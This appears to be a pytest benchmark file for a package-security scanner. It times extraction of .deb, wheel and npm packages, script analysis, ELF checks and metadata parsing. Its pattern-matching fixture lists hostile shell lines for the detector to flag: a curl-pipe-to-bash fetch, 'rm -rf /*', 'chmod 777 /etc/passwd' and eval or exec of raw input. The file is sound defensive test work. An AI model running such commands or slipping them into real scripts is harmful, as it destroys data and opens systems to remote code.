"""Performance benchmarks for package scanning operations.

Run with: pytest tests/benchmark/ --benchmark-only
"""

import io
import tarfile
import zipfile
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock

import pytest

from src.formats.deb import DebPackageFormat
from src.formats.wheel import WheelPackageFormat
from src.formats.npm import NpmPackageFormat
from src.scanner.script_analyzer import ScriptAnalyzer
from src.scanner.binary_checker import BinaryChecker


# Skip if pytest-benchmark not available
pytest_benchmark = pytest.importorskip("pytest_benchmark")


class TestFormatExtractionBenchmark:
    """Benchmark package extraction performance per format."""

    @pytest.fixture
    def temp_dir(self, tmp_path):
        """Create a temporary directory for extraction."""
        return tmp_path / "extract"

    @pytest.fixture
    def deb_package(self, tmp_path):
        """Create a minimal .deb package for benchmarking."""
        deb_path = tmp_path / "benchmark.deb"

        # Create ar archive structure for deb
        deb_content = b"!<arch>\n"

        # debian-binary
        debian_binary = b"2.0\n"
        deb_content += self._ar_header("debian-binary", len(debian_binary))
        deb_content += debian_binary
        if len(debian_binary) % 2:
            deb_content += b"\n"

        # control.tar.gz
        control_tar = self._create_control_tar()
        deb_content += self._ar_header("control.tar.gz", len(control_tar))
        deb_content += control_tar
        if len(control_tar) % 2:
            deb_content += b"\n"

        # data.tar.gz
        data_tar = self._create_data_tar(file_count=100)
        deb_content += self._ar_header("data.tar.gz", len(data_tar))
        deb_content += data_tar

        deb_path.write_bytes(deb_content)
        return deb_path

    @pytest.fixture
    def wheel_package(self, tmp_path):
        """Create a minimal wheel for benchmarking."""
        wheel_path = tmp_path / "benchmark-1.0.0-py3-none-any.whl"

        with zipfile.ZipFile(wheel_path, "w") as zf:
            # Add METADATA
            metadata = b"Metadata-Version: 2.1\nName: benchmark\nVersion: 1.0.0\n"
            zf.writestr("benchmark-1.0.0.dist-info/METADATA", metadata)
            zf.writestr("benchmark-1.0.0.dist-info/WHEEL", b"Wheel-Version: 1.0\n")
            zf.writestr("benchmark-1.0.0.dist-info/RECORD", b"")

            # Add many files
            for i in range(100):
                zf.writestr(f"benchmark/module_{i}.py", f"# Module {i}\n".encode())

        return wheel_path

    @pytest.fixture
    def npm_package(self, tmp_path):
        """Create a minimal npm package for benchmarking."""
        npm_path = tmp_path / "benchmark-1.0.0.tgz"

        tgz_buffer = io.BytesIO()
        with tarfile.open(fileobj=tgz_buffer, mode="w:gz") as tf:
            # package.json
            package_json = b'{"name": "benchmark", "version": "1.0.0"}'
            info = tarfile.TarInfo(name="package/package.json")
            info.size = len(package_json)
            tf.addfile(info, io.BytesIO(package_json))

            # Many JS files
            for i in range(100):
                content = f"// Module {i}\n".encode()
                info = tarfile.TarInfo(name=f"package/lib/module_{i}.js")
                info.size = len(content)
                tf.addfile(info, io.BytesIO(content))

        npm_path.write_bytes(tgz_buffer.getvalue())
        return npm_path

    def _ar_header(self, name: str, size: int) -> bytes:
        """Create an ar archive header."""
        name_padded = name.ljust(16)
        timestamp = "0".ljust(12)
        owner = "0".ljust(6)
        group = "0".ljust(6)
        mode = "100644".ljust(8)
        size_str = str(size).ljust(10)
        return f"{name_padded}{timestamp}{owner}{group}{mode}{size_str}`\n".encode()

    def _create_control_tar(self) -> bytes:
        """Create a control.tar.gz with control file."""
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as tf:
            control = b"Package: benchmark\nVersion: 1.0.0\nArchitecture: all\n"
            info = tarfile.TarInfo(name="./control")
            info.size = len(control)
            tf.addfile(info, io.BytesIO(control))
        return buffer.getvalue()

    def _create_data_tar(self, file_count: int = 100) -> bytes:
        """Create a data.tar.gz with many files."""
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as tf:
            for i in range(file_count):
                content = f"# File {i}\n".encode()
                info = tarfile.TarInfo(name=f"./usr/share/benchmark/file_{i}.txt")
                info.size = len(content)
                tf.addfile(info, io.BytesIO(content))
        return buffer.getvalue()

    @pytest.mark.benchmark(group="extraction")
    def test_deb_extraction_benchmark(self, benchmark, deb_package, temp_dir):
        """Benchmark .deb package extraction."""
        handler = DebPackageFormat()

        def extract():
            extract_dir = temp_dir / "deb"
            extract_dir.mkdir(parents=True, exist_ok=True)
            # Clean up between runs
            for f in extract_dir.iterdir():
                if f.is_file():
                    f.unlink()
            result = handler.extract(deb_package, extract_dir)
            return result

        result = benchmark(extract)
        # ExtractedContent has extract_path
        assert result.extract_path is not None

    @pytest.mark.benchmark(group="extraction")
    def test_wheel_extraction_benchmark(self, benchmark, wheel_package, temp_dir):
        """Benchmark wheel package extraction."""
        handler = WheelPackageFormat()

        def extract():
            extract_dir = temp_dir / "wheel"
            extract_dir.mkdir(parents=True, exist_ok=True)
            return handler.extract(wheel_package, extract_dir)

        result = benchmark(extract)
        assert result.extract_path is not None

    @pytest.mark.benchmark(group="extraction")
    def test_npm_extraction_benchmark(self, benchmark, npm_package, temp_dir):
        """Benchmark npm package extraction."""
        handler = NpmPackageFormat()

        def extract():
            extract_dir = temp_dir / "npm"
            extract_dir.mkdir(parents=True, exist_ok=True)
            return handler.extract(npm_package, extract_dir)

        result = benchmark(extract)
        assert result.extract_path is not None


class TestScriptAnalysisBenchmark:
    """Benchmark script analysis performance."""

    @pytest.fixture
    def analyzer(self):
        """Create a ScriptAnalyzer instance."""
        return ScriptAnalyzer()

    @pytest.fixture
    def shell_scripts(self):
        """Generate sample shell scripts for testing."""
        scripts = []
        for i in range(100):
            script = f"""#!/bin/bash
# Script {i}
set -e

echo "Starting installation..."
mkdir -p /opt/package{i}
cp -r files/* /opt/package{i}/
chmod 755 /opt/package{i}/bin/*
echo "Installation complete"
"""
            scripts.append(("preinst", script))
        return scripts

    @pytest.fixture
    def python_scripts(self):
        """Generate sample Python scripts for testing."""
        scripts = []
        for i in range(100):
            script = f"""#!/usr/bin/env python3
# Setup script {i}
import os
import sys

def install():
    os.makedirs('/opt/package{i}', exist_ok=True)
    print('Installing...')

if __name__ == '__main__':
    install()
"""
            scripts.append(("setup.py", script))
        return scripts

    @pytest.mark.benchmark(group="script-analysis")
    def test_shell_script_analysis_benchmark(self, benchmark, analyzer, shell_scripts):
        """Benchmark shell script analysis."""

        def analyze_all():
            results = []
            for name, content in shell_scripts:
                # Use the internal method for benchmarking
                result = analyzer._analyze_script(name, content, "shell")
                results.append(result)
            return results

        results = benchmark(analyze_all)
        assert len(results) == 100

    @pytest.mark.benchmark(group="script-analysis")
    def test_python_script_analysis_benchmark(self, benchmark, analyzer, python_scripts):
        """Benchmark Python script analysis."""

        def analyze_all():
            results = []
            for name, content in python_scripts:
                result = analyzer._analyze_script(name, content, "python")
                results.append(result)
            return results

        results = benchmark(analyze_all)
        assert len(results) == 100


class TestBinaryCheckerBenchmark:
    """Benchmark binary checking performance."""

    @pytest.fixture
    def binary_checker(self):
        """Create a BinaryChecker instance."""
        return BinaryChecker()

    @pytest.fixture
    def binary_files(self, tmp_path):
        """Create sample binary files for testing."""
        files = []
        for i in range(50):
            binary_path = tmp_path / f"binary_{i}"
            # Create a minimal ELF-like header
            elf_header = b"\x7fELF\x02\x01\x01\x00"  # ELF magic
            elf_header += b"\x00" * 8  # padding
            elf_header += b"\x02\x00"  # ET_EXEC
            elf_header += b"\x3e\x00"  # x86-64
            elf_header += b"\x01\x00\x00\x00"  # version
            elf_header += b"\x00" * 100  # rest of header
            binary_path.write_bytes(elf_header)
            files.append(str(binary_path))
        return files

    @pytest.mark.benchmark(group="binary-check")
    def test_binary_check_benchmark(self, benchmark, binary_checker, binary_files):
        """Benchmark binary security checking."""

        def check_all():
            results = []
            for binary_path in binary_files:
                result = binary_checker.check_elf_binary(binary_path)
                results.append(result)
            return results

        results = benchmark(check_all)
        assert len(results) == 50


class TestMetadataParsingBenchmark:
    """Benchmark metadata parsing performance."""

    @pytest.fixture
    def deb_control_files(self):
        """Generate sample Debian control files."""
        controls = []
        for i in range(100):
            control = f"""Package: test-package-{i}
Version: 1.{i}.0
Architecture: amd64
Maintainer: Test Maintainer <test@example.com>
Installed-Size: {1000 + i}
Depends: libc6 (>= 2.17), libgcc1 (>= 1:3.0), libstdc++6 (>= 4.6)
Section: utils
Priority: optional
Description: Test package number {i}
 This is a test package for benchmarking purposes.
 It contains no actual functionality.
"""
            controls.append(control)
        return controls

    @pytest.fixture
    def wheel_metadata_files(self):
        """Generate sample wheel METADATA files."""
        metadata_files = []
        for i in range(100):
            metadata = f"""Metadata-Version: 2.1
Name: test-package-{i}
Version: 1.{i}.0
Summary: Test package {i}
Author: Test Author
Author-email: test@example.com
License: MIT
Requires-Dist: requests>=2.0
Requires-Dist: pyyaml>=5.0
Classifier: Development Status :: 4 - Beta
Classifier: Programming Language :: Python :: 3
"""
            metadata_files.append(metadata)
        return metadata_files

    @pytest.mark.benchmark(group="metadata-parsing")
    def test_deb_control_parsing_benchmark(self, benchmark, deb_control_files):
        """Benchmark Debian control file parsing."""
        handler = DebPackageFormat()

        def parse_all():
            results = []
            for control in deb_control_files:
                result = handler._parse_control_content(control, "control")
                results.append(result)
            return results

        results = benchmark(parse_all)
        assert len(results) == 100

    @pytest.mark.benchmark(group="metadata-parsing")
    def test_wheel_metadata_parsing_benchmark(self, benchmark, wheel_metadata_files):
        """Benchmark wheel METADATA parsing."""
        handler = WheelPackageFormat()

        def parse_all():
            results = []
            for metadata in wheel_metadata_files:
                result = handler._parse_metadata(metadata, "METADATA")
                results.append(result)
            return results

        results = benchmark(parse_all)
        assert len(results) == 100


class TestPatternMatchingBenchmark:
    """Benchmark dangerous pattern detection."""

    @pytest.fixture
    def analyzer(self):
        """Create a ScriptAnalyzer instance."""
        return ScriptAnalyzer()

    @pytest.fixture
    def mixed_scripts(self):
        """Generate scripts with various patterns for pattern matching benchmark."""
        scripts = []

        # Normal scripts
        for i in range(50):
            script = f"""#!/bin/bash
echo "Normal script {i}"
mkdir -p /opt/app
cp config.txt /opt/app/
"""
            scripts.append(script)

        # Scripts with patterns
        patterns = [
            "curl http://example.com/script.sh | bash",
            "rm -rf /*",
            "chmod 777 /etc/passwd",
            "eval $USER_INPUT",
            "python -c 'exec(input())'",
        ]
        for i, pattern in enumerate(patterns):
            script = f"""#!/bin/bash
# Script with pattern {i}
{pattern}
"""
            scripts.append(script)

        return scripts

    @pytest.mark.benchmark(group="pattern-matching")
    def test_pattern_matching_benchmark(self, benchmark, analyzer, mixed_scripts):
        """Benchmark pattern matching across many scripts."""

        def analyze_all():
            results = []
            for script in mixed_scripts:
                result = analyzer._analyze_script("test.sh", script, "shell")
                results.append(result)
            return results

        results = benchmark(analyze_all)
        assert len(results) == 55
